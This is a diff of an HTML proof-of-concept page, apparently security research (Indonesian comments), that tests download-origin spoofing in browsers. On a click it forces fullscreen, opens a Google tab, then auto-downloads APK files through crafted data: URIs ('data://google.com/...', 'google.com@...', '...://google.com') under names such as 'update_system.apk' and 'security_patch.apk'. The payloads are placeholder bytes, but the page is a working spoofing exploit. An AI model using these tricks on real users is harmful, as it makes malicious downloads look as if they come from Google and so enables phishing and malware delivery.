@@ -1,80 +1,69 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+    <meta charset="UTF-8"> 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download & Fullscreen on Click</title>
+    <title>Download & Fullscreen Test - Variant</title> 
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            text-align: center;
-            padding-top: 50px;
-            background-color: #f9f9f9;
-        }
-        #triggerInput {
-            padding: 10px;
-            font-size: 16px;
-            width: 80%;
-            max-width: 300px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            text-align: center;
-        }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 50px; }
+        #triggerInput { padding: 10px; font-size: 16px; width: 80%; max-width: 300px; text-align: center; }
+        .btn-group { margin-top: 20px; }
+        button { padding: 10px 20px; margin: 5px; cursor: pointer; }
     </style>
-</head>
-<body>
+</head> 
+<body> 
 
-    <h2>POC by Chigorin!</h2>
-    <p>Ketuk pada kolom input di bawah untuk memicu aksi:</p>
-    
-    <input type="text" id="triggerInput" placeholder="Ketuk di sini...">
+    <h2>POC Download Spoofing Lab</h2> 
+    <input type="text" id="triggerInput" placeholder="Ketuk di sini untuk test...">
+
+    <div class="btn-group">
+        <p>Atau uji langsung variasi skema unduhan di bawah:</p>
+        <button onclick="openVariant('at_sign')">Varian 1 (@ Spoof)</button>
+        <button onclick="openVariant('slash_com')">Varian 2 (Double Slash)</button>
+    </div>
 
     <script>
+        // Trigger utama dari input (Menggunakan Fullscreen + Tab Baru + Download)
         document.getElementById('triggerInput').addEventListener('click', function() {
-            // 1. Memicu layar penuh (Fullscreen) langsung saat interaksi
             goFullScreen();
-            
-            // 2. Membuka tab baru ke Google (Akan diizinkan karena dipicu klik langsung)
             window.open('https://www.google.com', '_blank');
             
-            // 3. Menjalankan fungsi unduhan setelah delay 500ms
             setTimeout(function() {
-                openWin();
+                // Default fallback dari kode Anda (menggunakan file APK)
+                Puf("data://google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=", "google11.apk");
             }, 500);
-            
-        }, { once: false }); // Ubah ke true jika hanya ingin memicu satu kali saja
+        }, { once: false });
 
-        // Fungsi pembantu untuk membuat elemen unduhan (Sudah diperbaiki strukturnya)
-        function Puf(uri, name) {
-            const link = document.createElement("a");
-            link.href = uri;
-            link.download = name;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+        // Fungsi pembantu unduhan
+        function Puf(uri, name) { 
+            const link = document.createElement("a"); 
+            link.href = uri; 
+            link.download = name; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
         }
 
-        // Fungsi untuk mengeksekusi unduhan tiruan berkas .exe / .apk
-        function openWin() {
-            Puf(
-                "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-                "google11.exe"
-            );
-        }
-
-        // Fungsi API Fullscreen untuk berbagai browser
-        function goFullScreen() {
-            const element = document.documentElement;
-            if (element.requestFullscreen) {
-                element.requestFullscreen();
-            } else if (element.mozRequestFullScreen) { // Firefox
-                element.mozRequestFullScreen();
-            } else if (element.webkitRequestFullscreen) { // Chrome, Safari, Edge Legacy
-                element.webkitRequestFullscreen();
-            } else if (element.msRequestFullscreen) { // IE/Edge Old
-                element.msRequestFullscreen();
+        // Variasi skema URL alternatif untuk menguji celah parser baru
+        function openVariant(type) {
+            if (type === 'at_sign') {
+                // Menguji apakah parser keliru membaca karakter '@' sebagai kredensial basic-auth
+                // Format: data:[domain_palsu]@[domain_asli]
+                Puf("data:google.com@application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=", "update_system.apk");
+            } 
+            else if (type === 'slash_com') {
+                // Menguji apakah parser UI membaca string setelah data:asdf/ sebagai host
+                Puf("data:application/vnd.android.package-archive://google.com;base64,ZXN0dGVzdGVzdHRlc3Q=", "security_patch.apk");
             }
         }
-    </script>
-</body>
+
+        // Fungsi Fullscreen
+        function goFullScreen() { 
+            const element = document.documentElement; 
+            if (element.requestFullscreen) { element.requestFullscreen(); } 
+            else if (element.webkitRequestFullscreen) { element.webkitRequestFullscreen(); } 
+        } 
+    </script> 
+</body> 
 </html>
+
